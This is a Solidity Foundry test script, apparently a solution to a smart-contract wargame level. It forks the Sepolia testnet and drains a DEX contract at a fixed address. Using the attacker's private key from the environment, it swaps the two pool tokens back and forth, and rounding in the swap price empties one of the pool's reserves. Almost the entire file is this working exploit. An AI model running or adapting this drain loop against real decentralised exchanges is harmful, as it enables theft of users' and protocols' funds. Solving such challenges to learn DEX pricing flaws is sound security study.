// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IDex {
    function swap(address from, address to, uint256 amount) external;
    function getSwapPrice(address from, address to, uint256 amount) external view returns (uint256);
    function balanceOf(address token, address account) external view returns (uint256);
    function token1() external view returns (address);
    function token2() external view returns (address);
}

contract TestDex is Test {
    address private constant TARGET_ADDRESS = 0x9eAC51E02099AdA01FB97b3D2E4a73Ae1fa66a27;
    uint256 private constant INITIAL_ATTACKER_BALANCE = 10;
    uint256 private constant INITIAL_DEX_BALANCE = 100;
    IDex target;
    address attacker;
    address token1;
    address token2;

    function setUp() public {
        string memory rpcUrl = vm.envString("SEPOLIA_RPC_URL");
        vm.createSelectFork(rpcUrl);

        target = IDex(TARGET_ADDRESS);
        attacker = vm.addr(vm.envUint("PRIVATE_KEY"));       
        token1 = target.token1();
        token2 = target.token2();
    }

    function findMin(address token) internal view returns (uint256) {
        uint256 a = target.balanceOf(token, attacker);   
        uint256 b = target.balanceOf(token, TARGET_ADDRESS);
        return (a > b) ? b : a;
    }

    function testDex() public {
        uint256 balanceOfAttackerToken1 = target.balanceOf(token1, attacker);   
        uint256 balanceOfAttackerToken2 = target.balanceOf(token2, attacker);

        uint256 balanceOfDexToken1 = target.balanceOf(token1, TARGET_ADDRESS);   
        uint256 balanceOfDexToken2 = target.balanceOf(token2, TARGET_ADDRESS);   
        
        assert(balanceOfAttackerToken1 == INITIAL_ATTACKER_BALANCE);
        assert(balanceOfAttackerToken2 == INITIAL_ATTACKER_BALANCE);
        
        assert(balanceOfDexToken1 == INITIAL_DEX_BALANCE);
        assert(balanceOfDexToken2 == INITIAL_DEX_BALANCE);
        
        // false = swap A to B
        // true = swap B to A
        bool swapAtoB = false; 

        // Each swap decreases the pool's invariant (x * y)
        vm.startPrank(attacker, attacker);
        while(true) {
            if(swapAtoB) {
                uint256 swapAmountOfToken2 =  findMin(token2);
                if( swapAmountOfToken2 == 0 ){break;}
                IERC20(token2).approve(TARGET_ADDRESS, swapAmountOfToken2);
                target.swap(token2, token1, swapAmountOfToken2);
            }else{
                uint256 swapAmountOfToken1 = findMin(token1);
                if( swapAmountOfToken1 == 0 ){break;}
                IERC20(token1).approve(TARGET_ADDRESS, swapAmountOfToken1);
                target.swap(token1, token2, swapAmountOfToken1);
            }
            swapAtoB = !swapAtoB;
        }
        vm.stopPrank();

        uint256 finalBalanceOfAttackerToken1 = target.balanceOf(token1, attacker);   
        uint256 finalBalanceOfAttackerToken2 = target.balanceOf(token2, attacker);

        uint256 finalBalanceOfDexToken1 = target.balanceOf(token1, TARGET_ADDRESS);   
        uint256 finalBalanceOfDexToken2 = target.balanceOf(token2, TARGET_ADDRESS);

        assert(finalBalanceOfDexToken1 == 0 || finalBalanceOfDexToken2 == 0);
        console2.log("Final Dex balance of token 1: ",finalBalanceOfDexToken1);
        console2.log("Final Dex balance of token 2: ",finalBalanceOfDexToken2);
        console2.log("Final attacker balance of token 1: ",finalBalanceOfAttackerToken1);
        console2.log("Final attacker balance of token 2: ",finalBalanceOfAttackerToken2);
    }

}
